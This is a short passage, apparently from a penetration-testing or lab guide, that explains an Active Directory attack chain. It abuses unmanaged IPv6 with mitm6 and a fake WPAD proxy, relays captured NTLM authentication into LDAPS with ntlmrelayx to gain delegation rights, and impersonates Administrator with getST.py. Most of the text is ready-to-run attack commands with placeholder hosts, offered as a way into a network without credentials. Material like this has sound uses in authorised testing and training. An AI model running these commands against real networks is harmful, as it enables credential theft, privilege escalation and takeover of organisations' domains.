**Most networks run IPv6 but don't manage it.** Windows machines prefer IPv6 by default and auto-request an address via DHCPv6. `mitm6` answers those requests, makes you the machine's IPv6 DNS server, then feeds it a fake WPAD proxy — every HTTP request (including Windows Update/telemetry checks) routes through you, capturing NTLM auth which you relay straight into LDAP. This is a genuine **no-creds-needed** path to a foothold if the AD set's box has any unauthenticated network access.

```
# Terminal 1 — start the IPv6 DNS takeover:
mitm6 -d corp.local --ignore-nofqdn

# Terminal 2 — relay captured auth into LDAP, escalate a user's rights:
ntlmrelayx.py -6 -t ldaps://192.168.x.100 --delegate-access -wh fakewpad.corp.local

# Result: relayed machine account gets RBCD rights → chain into a shell:
getST.py -spn cifs/<TARGET_FQDN> corp.local/'FAKE-COMPUTER$':'' -impersonate Administrator -dc-ip 192.168.x.100
```